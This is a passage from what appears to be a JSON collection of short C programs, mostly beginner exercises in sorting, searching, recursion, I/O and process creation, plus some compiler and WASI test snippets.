i = 1; i < n_items; i++)\n        v[i] = v[i-1]+(rand()%3)+1;\n    return v;\n}\nunsigned char* funcao(unsigned short* v1, unsigned short* v2, int n){\n    unsigned char* found = calloc(n+1, sizeof(unsigned char));\n    found = recursive_n_compare_function(v1, v2, found, 0, n, 0, n);\n    return found;\n}\nint recursive_square_compare_function(unsigned short key, unsigned short *v2, int *v2_pos, int end){\n    int auxiliar_v2pos = *v2_pos;\n    if(auxiliar_v2pos >= end)\n        return 0;\n    if(key < v2[auxiliar_v2pos])\n        return 0;\n    if(key == v2[auxiliar_v2pos]){\n        auxiliar_v2pos++;\n        *v2_pos = auxiliar_v2pos;\n        return 1;\n    }\n    auxiliar_v2pos++;\n    *v2_pos = auxiliar_v2pos;\n    return recursive_square_compare_function(key, v2, v2_pos, end);\n}\nint recursive_nlogn_compare_function(unsigned short key, unsigned short* v2, int begin, int end){\n    int half = (int)((begin+end)/2);\n    if(half >= end) return 0;\n    if(key == v2[half]) return 1;\n    if(key < v2[half]) return recursive_nlogn_compare_function(key, v2, begin, half);\n    return recursive_nlogn_compare_function(key, v2, half+1, end);\n}\nunsigned char *recursive_n_compare_function(unsigned short* v1, unsigned short* v2, unsigned char* found, int begin_v1, int end_v1, int begin_v2, int end_v2){\n    if(begin_v1 >= end_v1)\n        return found;\n    if(begin_v2 >= end_v2)\n        return found;\n    unsigned short value_v1 = v1[begin_v1], value_v2 = v2[begin_v2];\n    if(value_v1 == value_v2){\n        found[begin_v1] = 1;\n        begin_v1++;\n        begin_v2++;\n    }\n    if(value_v1 > value_v2)\n        begin_v2++;\n    if(value_v1 < value_v2){\n        found[begin_v1] = 0;\n        begin_v1++;\n    }\n    return recursive_n_compare_function(v1, v2, found, begin_v1, end_v1, begin_v2, end_v2);\n}",
    "#include <sys/types.h>\nint main()\n{\n   ;\n   return 0;\n}",
    "#include <stdio.h>\nint main(void){\n    printf(\"try!\");\n}",
    "#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\nint main()\n{\n  int num = 0;\n  for (int count = 0; count < 10; count++) {\n    num = num + 1;\n    printf(\"%d \", num);\n  }\n  printf(\"\\n\");\n  return(0);\n}",
    "#include <stdio.h>\n#include <string.h>\nint T, W, H;\nint alt[100][100];\nint c[100][100];\nchar next_color;\nchar get_color(int i, int j) {\n    if (c[i][j])\n        return c[i][j];\n    int min_alt = alt[i][j] - 1;\n    if (i > 0 && alt[i - 1][j] < min_alt)\n        min_alt = alt[i - 1][j];\n    if (j > 0 && alt[i][j - 1] < min_alt)\n        min_alt = alt[i][j - 1];\n    if (j < W - 1 && alt[i][j + 1] < min_alt)\n        min_alt = alt[i][j + 1];\n    if (i < H - 1 && alt[i + 1][j] < min_alt)\n        min_alt = alt[i + 1][j];\n    if (i > 0 && alt[i - 1][j] == min_alt)\n        return c[i][j] = get_color(i - 1, j);\n    if (j > 0 && alt[i][j - 1] == min_alt)\n        return c[i][j] = get_color(i, j - 1);\n    if (j < W - 1 && alt[i][j + 1] == min_alt)\n        return c[i][j] = get_color(i, j + 1);\n    if (i < H - 1 && alt[i + 1][j] == min_alt)\n        return c[i][j] = get_color(i + 1, j);\n    return c[i][j] = next_color++;\n}\nint main() {\n    scanf(\"%d\", &T);\n    for (int n = 1; n <= T; n++) {\n        memset(c, 0, sizeof(c));\n        next_color = 'a';\n        scanf(\"%d %d\", &H, &W);\n        for (int i = 0; i < H; i++)\n            for (int j = 0; j < W; j++)\n                scanf(\"%d\", &alt[i][j]);\n        for (int i = 0; i < H; i++)\n            for (int j = 0; j < W; j++)\n                if (!c[i][j])\n                    get_color(i, j);\n        printf(\"Case #%d:\\n\", n);\n        for (int i = 0; i < H; i++)\n            for (int j = 0; j < W; j++) {\n                printf(\"%c\", c[i][j]);\n                if (j < W - 1)\n                    printf(\" \");\n                else\n                    puts(\"\");\n            }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n int n, m;\n    scanf(\"%d\", &n);\n for(int i = 0; i < n; ++i) {\n  scanf(\"%d\", &m);\n  if(m) {\n   printf(\"HARD\\n\");\n   return 0;\n  }\n }\n printf(\"EASY\\n\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <fcntl.h>\nint main( int argc, char *argv[] )\n{\n    char result[256] = {0};\n    int fd = open( \"/dev/reverse\", ((0x04000000) | (0x10000000)) );\n    if ( fd < 0 )\n    {\n        perror( \"Error: Reverse\" );\n        return -1;\n    }\n    printf( \"Input : %s\\n\", argv[1] );\n    write( fd, argv[1], strlen( argv[1] ) );\n    read ( fd, result, strlen( argv[1] ) );\n    printf( \"Output: %s\\n\", result );\n    close( fd );\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n    float sal=0;\n    scanf(\"%f\",&sal);\n    if(sal<=1000){\n        printf(\"%.2f\\n\",sal+=(sal*20)/100);\n    }else{\n        if(sal>1000&&sal<=1500){\n            printf(\"%.2f\\n\",sal+=(sal*15)/100);\n        }\n        else if(sal>1500&&sal<=2000){\n            printf(\"%.2f\\n\",sal+=(sal*10)/100);\n        }\n        else if(sal>2000){\n            printf(\"%.2f\\n\",sal+=(sal*5)/100);\n        }\n    }\n}",
    "#include <stdio.h>\nint main() {\n    int t, n, Case = 0;\n    scanf(\"%d\", &t);\n    while(t--) {\n        scanf(\"%d\", &n);\n        printf(\"Case #%d: %d\", ++Case, n);\n        int i, cnt = 0;\n        for(i = 2; cnt < 2; i++) {\n            if(n%i == 0) {\n                printf(\" = %d * %d\", i, n/i);\n                cnt++;\n            }\n        }\n        puts(\"\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint* suma_alloc(int a, int b);\nint* suma_alloc(int a, int b) {\n int* ret = malloc(sizeof(int));\n *ret = a + b;\n return ret;\n}\nint* d;\nint main() {\n int a = 5;\n int b = 10;\n d = suma_alloc(a, b);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n    int numberOfNumbers, sum = 0;\n    printf(\"Please enter number of numbers: \");\n    scanf(\"%d\", &numberOfNumbers);\n    int *numbers = (int *)calloc(numberOfNumbers, sizeof(int));\n    if(numbers == ((void*)0)) {\n        printf(\"Memory allocation unsuccefull\");\n        exit(1);\n    }\n    for(int i = 0; i < numberOfNumbers; i++) {\n        printf(\"Please provide a number: \");\n        scanf(\"%d\", numbers + i);\n    }\n    for(int i = 0; i < numberOfNumbers; i++) {\n        sum += *(numbers + i);\n    }\n    printf(\"Total sum of the numbers is: %d\\n\", sum);\n    return 0;\n}",
    "#include <stdio.h>\n\n\n\nint k;\nint v = 7000;\nint v2 = 8000;\nint p[] = {3,4,5,6,7,8,9,10,2,9,3,4,5,6,7,8,9,10,2,9,3,4,5,6,7,8,9,10,2,9};\nchar str[] = \"\\xf0Hello my name is David.\";\nint res[20];\nint foo(int x){\n  int a[] = {1,3,6,7};\n  int i;\n  for(i=0; i<4;i++)\n    res[i] = a[i];\n  return (int)&res;\n}\nint main()\n{\n\n\n\n\n  return 0;\n}",
    "int main() {\n  volatile long long a = 0x0000000000000001L;\n  if (__builtin_ffsll(a) != 1) {\n    return 1;\n  }\n  volatile long long b = 0x000000006000beefL;\n  if (__builtin_ffsll(b) != 1) {\n    return 1;\n  }\n  volatile long long c = 0x000000008abc0000L;\n  if (__builtin_ffsll(c) != 19) {\n    return 1;\n  }\n  volatile long long d = 0x0000010000000000L;\n  if (__builtin_ffsll(d) != 41) {\n    return 1;\n  }\n  volatile long long e = 0x0000000000000000L;\n  if (__builtin_ffsll(e) != 0) {\n    return 1;\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint fibo(int n, int memo[])\n{\n    if(memo[n] != 0) return memo[n];\n    else if(n == 0 || n == 1) return 1;\n    int result = fibo(n-1, memo) + fibo(n-2, memo);\n    memo[n] = result;\n    return result;\n}\nint fibo_bottom_up(int n)\n{\n    if(n == 0 || n == 1) return 1;\n    int memo[n+1];\n    memo[0] = 0;\n    memo[1] = 1;\n    for(int i=2;i<=n;i++)\n    {\n        memo[i] = memo[i-1] + memo[i-2];\n    }\n    return memo[n];\n}\nint main()\n{\n    int memo[11] = {0};\n    printf(\"%d\\n\", fibo(10, memo));\n    printf(\"%d\\n\", fibo_bottom_up(11));\n}",
    "#include<stdio.h>\nint main(){\n    int n,i,j,k;\n    printf(\"Enter a Number: \");\n    scanf(\"%d\",&n);\n    for(i=0; i<n; i++){\n        for(j=n; j>i; j--){\n            printf(\"* \");\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint arr[100];\nvoid QuickSort(int low,int high)\n{\n    int pivot, i, j, temp;\n    if (low < high)\n    {\n        pivot = low;\n        i = low;\n        j = high;\n        while (i < j)\n        {\n            while (arr[i] <= arr[pivot] && i <= high)\n            {\n                i++;\n            }\n            while (arr[j] > arr[pivot] && j >= low)\n            {\n                j--;\n            }\n            if (i < j)\n            {\n                temp = arr[i];\n                arr[i] = arr[j];\n                arr[j] = temp;\n            }\n        }\n        temp = arr[j];\n        arr[j] = arr[pivot];\n        arr[pivot] = temp;\n        QuickSort( low, j - 1);\n        QuickSort( j + 1, high);\n    }\n}\nint main()\n{\n    int i, n;\n    printf(\"Enter the size of the array :\");\n    scanf(\"%d\",&n);\n    arr[n] = 5000;\n    printf(\"\\nEnter the elements of the array :\");\n    for(i=0;i<n;i++)\n    {\n        scanf(\"%d\",&arr[i]);\n    }\n    printf(\"\\nEntered array :\");\n    for(i=0;i<n;i++)\n    {\n        printf(\"%d \",arr[i]);\n    }\n    QuickSort(0,n-1);\n    printf(\"\\nSorted array :\");\n    for(i=0;i<n;i++)\n    {\n        printf(\"%d \",arr[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[])\n{\n FILE *p;\n float read_buf[128],buf[5] = {10.2,15.6,25.6,157.3,200.1};\n p = fopen(argv[1], \"rb+\");\n int i;\n if(p == ((void*)0))\n {\n  perror(\"open fail\");\n  return -1;\n }\n int w_cnt = fwrite(buf, sizeof (float), sizeof(buf), p);\n if(w_cnt < 0)\n {\n  perror(\"fwrite fail\");\n  return -1;\n }\n fflush(p);\n rewind(p);\n fread(read_buf, sizeof(float), 5, p);\n for(i=0; i<5; i++)\n  printf(\"read :%.2f  \", read_buf[i]);\n printf(\"\\n\");\n int fc = fclose(p);\n if(fc<0)\n {\n  perror(\"fclose fail\");\n  return -1;\n }\n return 0;\n}",
    "#include<stdio.h>\n#include<string.h>\nchar a[100][100],b[100][100],t[100];\nint main()\n{\n int n,i,j,k;\n scanf(\"%d\",&n);\n for(i=0;i<n;i++)\n {\n  scanf(\"%s%s\",a[i],b[i]);\n }\n for(i=0;i<n-1;i++)\n {\n  for(j=0;j<n-i-1;j++)\n  {\n   if(strcmp(b[j],b[j+1])>0)\n   {\n    strcpy(t,b[j]);\n    strcpy(b[j],b[j+1]);\n    strcpy(b[j+1],t);\n    strcpy(t,a[j]);\n    strcpy(a[j],a[j+1]);\n    strcpy(a[j+1],t);\n   }\n  }\n }\n for(i=0;i<n;i++)\n {\n  printf(\"%s\\n\",a[i]);\n }\n return 0;\n}",
    "int __attribute__ ((always_inline)) foo1()\n   {\n     return 0;\n   }\nint __attribute__ ((noinline)) foo2()\n   {\n     return 0;\n   }\nint __attribute__ ((pure)) foo3()\n   {\n     return 0;\n   }\nint main()\n   {\n     return foo1() + foo2() + foo3();\n   }",
    "#include <stdio.h>\n#include <memory.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <ctype.h>\nint hexstring_to_bytearray(char *p_hexstring, char **pp_out, int *p_i_out_len)\n{\n    size_t i;\n    size_t i_str_len;\n    char *p_out = ((void*)0);\n    int i_out_len = 0;\n    int i_offset = 0;\n    if (p_hexstring == ((void*)0))\n        return -1;\n    i_str_len = strlen(p_hexstring);\n    if (i_str_len == 2)\n        i_out_len = 1;\n    else if ((i_str_len - 2) % 3 == 0)\n        i_out_len = (i_str_len - 2) / 3 + 1;\n    else\n    {\n        fprintf((stderr), \"malformed input hex string\\n\");\n        goto error;\n    }\n    p_out = (char *) malloc((size_t) i_out_len);\n    if (p_out == ((void*)0))\n        return -1;\n    for (i = 0; i < i_str_len;)\n    {\n        if (isxdigit(p_hexstring[i]) == 0 || isxdigit(p_hexstring[i + 1]) == 0)\n        {\n            fprintf((stderr), \"malformed input hex string\\n\");\n            goto error;\n        }\n        sscanf(p_hexstring + i, \"%2x\", (unsigned int *) &(p_out[i_offset++]));\n        if (i + 2 == i_str_len)\n            break;\n        if (p_hexstring[i + 2] != ' ')\n        {\n            fprintf((stderr), \"malformed input hex string\\n\");\n            goto error;\n        }\n        i += 3;\n    }\n    *pp_out = p_out;\n    *p_i_out_len = i_out_len;\n    return 0;\nerror:\n    if (p_out)\n        free(p_out);\n    return -1;\n}\nint main(int argc, char **argv)\n{\n    int nUsartfd;\n    char *pDevice = \"/dev/ttyUSB0\";\n    nUsartfd = open(pDevice, ((0x04000000) | (0x10000000)) | (0) | O_NDELAY);\n    if (nUsartfd == -1)\n    {\n        perror(\"open serial failed\");\n        return -1;\n    }\n    char *pSendData = ((void*)0);\n    int iSendDataLen = 0;\n    char id = 0;\n    char buff[256] = \"AA 00 20 81 73 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 8E\";\n    if (hexstring_to_bytearray(buff, &pSendData, &iSendDataLen))\n    {\n        perror(\"HexStringToBytearray failed\\n\");\n        return -1;\n    }\n    while (1)\n    {\n        pSendData[4] = id++;\n        pSendData[35] = pSendData[4] + pSendData[3];\n        int iWriteLen = write(nUsartfd, pSendData, iSendDataLen);\n        printf(\"Send Len:[%d]\\n\", iWriteLen);\n        usleep(20000);\n    }\n    if (pSendData)\n    {\n        free(pSendData);\n        pSendData = ((void*)0);\n    }\n    close(nUsartfd);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(void) {\n    char string[101];\n    int x, y;\n    printf(\"Digite uma frase: \");\n    scanf(\"%[^\\n]%*c\", string);\n    char novaString[101];\n    int novaStringIndice = 1;\n    do {\n        printf(\"Digite dois numeros inteiros (x y) sendo y > x: \");\n        scanf(\"%i %i\", &x, &y);\n    } while (x <= 0 || y <= 0);\n    for (int i = x; i < y; i++) {\n        novaString[novaStringIndice] = string[i];\n        novaStringIndice++;\n    }\n    char olaMundo[] = \"Ola mundo\";\n    strcat(novaString, olaMundo);\n    printf(\"Frase final: %s\", novaString);\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char** argv) {\n    const char* text = argv[1];\n    char tape[30000] = { 0 };\n    char* p = tape;\n    int depth = 0;\n    while (*text) {\n        switch (*text) {\n            case '>':\n                p++;\n                break;\n            case '<':\n                p--;\n                break;\n            case '+':\n                ++*p;\n                break;\n            case '-':\n                --*p;\n                break;\n            case '.':\n                putchar(*p);\n                break;\n            case ',':\n                *p = getchar();\n                break;\n            case '[':\n                if (!*p) {\n                    depth = 0;\n                    while (!(*text == ']' && depth == 0)) {\n                        if (*text == '[') depth++;\n                        if (*text == ']') depth--;\n                        text++;\n                    }\n                }\n                break;\n            case ']':\n                if (*p) {\n                    depth = 0;\n                    while (*text != '[' && depth != 0) {\n                        if (*text == ']') depth++;\n                        if (*text == '[') depth--;\n                        text--;\n                    }\n                    text--;\n                }\n        }\n        text++;\n    }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <ctype.h>\nint main(){\n    char caracter;\n    printf(\"Digite um caracter: \");\n    scanf(\"%c\", &caracter);\n    printf(\"Caracter: %c  -  Valor na tabela ascii: %d\\n\", caracter, caracter);\n    printf(\"Digite o valor do caracter: \");\n    scanf(\"%d\", &caracter);\n    printf(\"Caracter: %c  -  Valor na tabela ascii: %d\\n\", caracter, caracter);\n    system(\"pause\");\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n    int n, i, j;\n    int k = 0;\n    scanf(\"%d\", &n);\n    int a[n];\n    for(i=0;i<n;i++){\n        scanf(\"%d\", &a[i]);\n    }\n    for(i=1;i<n;i++){\n        if(a[i]>a[i-1]){\n            k++;\n            if(k>j){\n                j = k;\n            }\n        }\n        else{\n            k=0;\n        }\n    }\n}",
    "int main(){\n  int j = 7;\n  int k = 0;\n  int i;\n  int t = 0;\n  for (i = 0; i < j; i++) {\n    while(k<30){\n      k++;\n    }\n  }\n  return j;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main()\n{\n int up,down,h;\n scanf(\"%d%d%d\",&up,&down,&h);\n double ans=(double)((up+down)*h)/2;\n printf(\"%.1f\\n\",ans);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n int n,i,flag=0,key,mid;\n printf(\"Enter the number of elements you want in your list : \");\n scanf(\"%d\",&n);\n int arr[n],UB=n-1,LB=0;\n printf(\"\\nEnter the sorted elements in the list : \");\n for(i=0;i<n;i++)\n {\n  scanf(\"%d\",&arr[i]);\n }\n printf(\"\\nEnter the data you want to search in the list : \");\n scanf(\"%d\",&key);\n while(LB<=UB)\n {\n mid=(UB+LB)/2;\n if(arr[mid]==key)\n {\n  printf(\"\\nData found at index %d\",mid);\n  flag=1;\n  break;\n }\n else if(arr[mid]<key)\n {\n  LB=mid+1;\n }\n else if(arr[mid]>key)\n {\n  UB=mid-1;\n }\n }\n if(flag==0)\n {\n  printf(\"\\nData not found in the list!!\");\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\nint main(void){\n    int fpid;\n    fpid = fork();\n    printf(\"ID del proceso: %d\\n\", fpid);\n    if (fpid == 0)\n        printf(\"Proceso hijo \\n\" );\n    else\n        printf(\"Proceso padre \\n\");\n    return(0);\n}",
    "#include <stdio.h>\nint main()\n{\n puts(\"Please input a line of string:\");\n char c;\n while ((c=getchar())!=(-1))\n {\n  if (c>='0'&&c<='9') continue;\n  putchar(c);\n }\n return 0;\n}",
    "#include <stdio.h>\nconst int Max=3;\nint main(void)\n{\n        int var[]={10, 100, 1000};\n        int i, *ptr[Max];\n        for (i=0; i<Max; i++)\n        {\n                ptr[i]=&var[i];\n                printf(\"address: var[%d]=%x\\n\", i, ptr[i]);\n                printf(\"value: var[%d]=%d\\n\", i, *ptr[i]);\n        }\n        return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint factorial(int f);\nint main ()\n{\n    int n;\n    do\n    {\n    printf(\"Calculate the factorial of which positive integer? \");\n    scanf(\"%i\", &n);\n    } while (n < 1);\n    printf(\"%i\\n\", factorial(n));\n}\nint factorial(int f)\n{\n    if (f > 1)\n    {\n        return f * factorial(f - 1);\n    }\n    else\n    {\n        return 1;\n    }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n const char *key = \"PWD\";\n char *val;\n int i = setenv(\"MY\", \"name\", 1);\n val = getenv(\"PATH\");\n printf(\"%s\\n\", val);\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main(){\n    printf(\"C programming on Linux %f\", sqrt(2));\n    return 0;\n}",
    "#include<unistd.h>\n#include<stdio.h>\n#include<stdlib.h>\nint main() {\n  int filedes[2];\n  const int BSIZE = 100;\n  char buf[BSIZE];\n  ssize_t nbytes;\n  int status = pipe(filedes);\n  if( status == -1 ){\n    printf(\"An error has occured!\");\n    return -1;\n  }\n  switch(fork()){\n    case -1:\n      printf(\"Couldn't spawn a new process\");\n    break;\n    case 0:\n      printf(\"Child process\\n\");\n      close(filedes[1]);\n      nbytes = read(filedes[0], buf, BSIZE);\n      if(nbytes < 0){\n        printf(\"Error encountered reading pipe in child\");\n      }\n      else {\n        printf(\"\\n%d: %s\", nbytes, buf);\n      }\n      close(filedes[0]);\n      exit(0);\n    break;\n    default:\n      printf(\"Parent process\\n\");\n      close(filedes[0]);\n      write(filedes[1], \"Hello world\\n\", 12);\n      close(filedes[1]);\n      exit(0);\n  }\n  return 0;\n}",
    "#include <stdio.h>\nint Read_Number_of_Elements()\n{\n    int n;\n    printf(\"Enter the number of elements:\");\n    scanf(\"%d\",&n);\n    return n;\n}\nvoid Read_Elements_to_Array(int *p, int n)\n{\n    for(int i=0;i<n;i++)\n    {\n        scanf(\"%d\",&p[i]);\n    }\n}\nvoid QuickSort(int ar[],int low,int high)\n{\n    int pivot, i, j, temp;\n    if (low < high)\n    {\n        pivot = low;\n        i = low;\n        j = high;\n        while (i < j)\n        {\n            while (ar[i] <= ar[pivot] && i <= high)\n            {\n                i++;\n            }\n            while (ar[j] > ar[pivot] && j >= low)\n            {\n                j--;\n            }\n            if (i < j)\n            {\n                temp = ar[i];\n                ar[i] = ar[j];\n                ar[j] = temp;\n            }\n        }\n        temp = ar[j];\n        ar[j] = ar[pivot];\n        ar[pivot] = temp;\n        QuickSort(ar, low, j - 1);\n        QuickSort(ar, j + 1, high);\n    }\n}\nint Read_Element_to_Search()\n{\n    int s;\n    printf(\"\\nEnter the element to search:\");\n    scanf(\"%d\",&s);\n    return s;\n}\nint Binary_Search(int *p, int l, int h, int s)\n{\n    while(h>=l){\n        int middle = l+(h-l)/2;\n        if(p[middle] == s){\n            return middle+1;\n        }\n        if(p[middle] >s){\n            h = middle-1;\n        }\n        l = middle+1;\n    }\n    return -1;\n}\nint main()\n{\n    int n;\n    int a[100];\n    int s;\n    int p;\n    int k,i;\n    n = Read_Number_of_Elements();\n    Read_Elements_to_Array(a, n);\n    printf(\"\\nEntered array :\");\n    for(i=0;i<n;i++)\n    {\n        printf(\"%d \",a[i]);\n    }\n    QuickSort(a,0,n-1);\n    printf(\"\\nSorted array :\");\n    for(i=0;i<n;i++)\n    {\n        printf(\"%d \",a[i]);\n    }\n        s = Read_Element_to_Search();\n        p = Binary_Search(a, 0, n, s);\n        if(p==-1)\n            printf(\"\\n Element not found\");\n        else\n            printf(\"\\n Element found at position: %d\",p);\n        return 0;\n}",
    "#include <stdio.h>\nint isDiffer(char a, char b)\n{\n    int count = 0;\n    for (int i = 0; i < 8; i++)\n    {\n        if (((a >> i) & 1) != ((b >> i) & 1))\n        {\n            count++;\n        }\n    }\n    if(count == 1)\n    {\n        return 2;\n    }\n    else if(count == 0)\n    {\n        return 1;\n    }\n    return 0;\n}\nint main()\n{\n    char firstWord[256];\n    char secondWord[256];\n    printf(\"Type in the first word to be compared: \\n\");\n    scanf(\" %s\", &firstWord);\n    printf(\"Type in the second word to be compared: \\n\");\n    scanf(\" %s\", &secondWord);\n     if(isDiffer(firstWord[0],secondWord[0]) == 2)\n    {\n        printf(\"first char is %c second is %c \\n\",firstWord[0], secondWord[0]);\n        printf(\"The given two characters differ by a single bit\");\n    }\n    else if(isDiffer(firstWord[0],secondWord[0]) == 1)\n    {\n        printf(\"first char is %c second is %c \\n\",firstWord[0], secondWord[0]);\n        printf(\"The given two characters have the same number of bits\");\n    }\n     else\n    {\n        printf(\"first char is %c second is %c \\n\",firstWord[0], secondWord[0]);\n        printf(\"The given two characters differ by more than one single bit\");\n    }\n   return 0;\n}",
    "#include <stdio.h>\nvoid swap(int *a, int *b);\nint main() {\n    int a, b;\n    printf(\"\\nI'm in main and insert data to swap\\n\");\n    printf(\"Insert the first data: \");\n    scanf(\"%d\", &a);\n    printf(\"Insert the second data: \");\n    scanf(\"%d\", &b);\n    swap(&a, &b);\n    printf(\"Come back to main and finish\\n\");\n    printf(\"The new a value is: %d the new b value is: %d\\n\", a, b);\n    return 0;\n}\nvoid swap(int *a, int *b) {\n    int temp;\n    printf(\"\\nProcessing\\n\");\n    temp = *a;\n    *a = *b;\n    *b = temp;\n}",
    "#include <errno.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\nint main(int argc, char **argv)\n{\n    int forwardArgsStartIdx = 0;\n    if (argc >= 3 && strcmp(argv[1], \"-C\") == 0) {\n        forwardArgsStartIdx = 2;\n        int ret = chdir(argv[2]);\n        if (ret != 0) {\n            fprintf((stderr), \"%s: cannot change directory to '%s': %s\\n\", argv[0], argv[2], strerror(errno));\n            return 125;\n        }\n    }\n    char *envExe = \"/usr/bin/env\";\n    argv[forwardArgsStartIdx] = envExe;\n    return execv(envExe, &argv[forwardArgsStartIdx]);\n}",
    "#include<stdio.h>\nint main(void)\n{\n printf(\"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");\n int d1,d2,d3,d4,d5,d6,d7,d8,d9,d10,d11,cd,cd1,cd2,total;\n printf(\"Enter UPC(Universal Product Code) (format: x xxxxx xxxxx x): \");\n scanf(\"%1d %1d%1d%1d%1d%1d %1d%1d%1d%1d%1d %1d\",&d1,&d2,&d3,&d4,&d5,&d6,&d7,&d8,&d9,&d10,&d11,&cd);\n total=3*(d1+d3+d5+d7+d9+d11)+(d2+d4+d6+d8+d10);\n cd1=9-(total-1)%10;\n cd2=10-total%10;\n printf(\"\\nTotal = %d\",total);\n printf(\"\\nUser entered check digit: %d\",cd);\n printf(\"\\nCheck digit calculated using technique 1: %d\",cd1);\n printf(\"\\nCheck digit calculated using technique 2: %d\",cd2);\n printf(\"\\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");\n return 0;\n}",
    "#include <stdio.h>\nvoid printLine(int currentNumber, int numberofColumns){\n  int currentColumn = 1;\n  while (currentColumn <= numberofColumns){\n    printf(\"%d\\t\", currentColumn * currentNumber);\n    currentColumn += 1;\n  }\n  printf(\"\\n\");\n}\nvoid Table(int numberofRows, int numberOfColumns){\n int currentRow = 1;\n while(currentRow <= numberofRows){\n   printLine(currentRow, numberOfColumns);\n   currentRow += 1;\n }\n}\nint main(void) {\n  Table(3, 10);\n  return 0;\n}",
    "int main () {\n  int b = 0;\n  int i = 0;\n  for (i=0; i < 100; i++) {\n    b = b + i;\n  }\n  for (i=0; i < 100; i++) {\n    b = b * i;\n  }\n  for (i=0; i < 100; i++) {\n    b = b - i;\n  }\n  for (i=0; i < 100; i++) {\n    b = b / i;\n  }\n  for (i=0; i < 100; i++) {\n    b = b & i;\n  }\n  for (i=0; i < 100; i++) {\n    b = b ^ i;\n  }\n  for (i=0; i < 100; i++) {\n    b = b | i;\n  }\n  for (i=0; i < 100; i++) {\n    b += i;\n  }\n  for (i=0; i < 100; i++) {\n    b *= i;\n  }\n  for (i=0; i < 100; i++) {\n    b -= i;\n  }\n  for (i=0; i < 100; i++) {\n    b /= i;\n  }\n  for (i=0; i < 100; i++) {\n    b &= i;\n  }\n  for (i=0; i < 100; i++) {\n    b ^= i;\n  }\n  for (i=0; i < 100; i++) {\n    b |= i;\n  }\n  for (i=0; i < 100; i++) {\n    b++;\n  }\n  for (i=0; i < 100; i++) {\n    b--;\n  }\n  for (i=0; i < 100; i++) {\n    ++b;\n  }\n  for (i=0; i < 100; i++) {\n    --b;\n  }\n  for (i=0; i < 100; i++) {\n    b = b && (i == i);\n  }\n  for (i=0; i < 100; i++) {\n    b = b || (i == i);\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <inttypes.h>\nint main(int argc, const char * argv[]) {\n    int16_t me16;\n    me16 = 4593;\n    printf(\"First, assume int16_t is short: \");\n    printf(\"me16 = %hd\\n\", me16);\n    printf(\"Next, let's not make any assumptions. \\n\");\n    printf(\"Insted, use a \\\"macro\\\" from inttypes.h: \");\n    printf(\"me16 = %\" \"hd\" \"\\n\", me16);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int i, j, k;\n    int arr[10][10];\n    for (i = 0; i < 10; i++)\n    {\n        for (j = 0; j < 10; j++)\n        {\n            for (k = 2; k <= 10; k++)\n            {\n                arr[i][j] = k * (j + 1);\n                printf(\"%dX%d =%d\\t\", k, j+1, arr[i][j]);\n            }\n            printf(\"\\n\");\n        }\n        break;\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n  int no1,no2;\n  float average;\n  printf(\"enter marks of 1st subject=\");\n  scanf(\"%d\",&no1);\n  printf(\"enter marks of 2nd subject=\");\n  scanf(\"%d\",&no2);\n  average=(no1+no2)/2;\n  printf(\"average=%.2f\",average);\n  return 0;\n}",
    "#include <sys/types.h>\n#include <sys/stat.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\nvoid openFile()\n{\n    int fd = open(\"test.txt\", ((0x04000000) | (0x10000000)) | (((__wasi_oflags_t)(1 << 0)) << 12));\n    printf(\"new file fd = %d\\n\", fd);\n    int ret = close(fd);\n    printf(\"close new file ret = %d\\n\", ret);\n}\nvoid deleteFile()\n{\n    int ret = unlink(\"test.txt\");\n    printf(\"delete new file ret = %d\\n\", ret);\n    perror(\"delete file error\");\n}\nint main(int argc, char const *argv[])\n{\n    openFile();\n    return 0;\n}",
    "#include<stdio.h>\n#include<time.h>\nint bitcount1(unsigned x);\nint bitcount2(unsigned x);\nint main()\n{\n    clock_t tic = clock();\n    printf(\"%d\\n\", bitcount1(1));\n    printf(\"%d\\n\", bitcount1(10));\n    printf(\"%d\\n\", bitcount1(100));\n    printf(\"%d\\n\", bitcount1(1000));\n    printf(\"%d\\n\", bitcount1(10000));\n    printf(\"%d\\n\", bitcount1(100000));\n    printf(\"%d\\n\", bitcount1(1000000));\n    clock_t toc = clock();\n    double time = (double)(toc - tic) / ((clock_t)1000000000);\n    printf(\"\\nbitcount1: %g\\n\\n\", time);\n    tic = clock();\n    printf(\"%d\\n\", bitcount2(1));\n    printf(\"%d\\n\", bitcount2(10));\n    printf(\"%d\\n\", bitcount2(100));\n    printf(\"%d\\n\", bitcount2(1000));\n    printf(\"%d\\n\", bitcount2(10000));\n    printf(\"%d\\n\", bitcount2(100000));\n    printf(\"%d\\n\", bitcount2(1000000));\n    toc = clock();\n    time = (double)(toc - tic) / 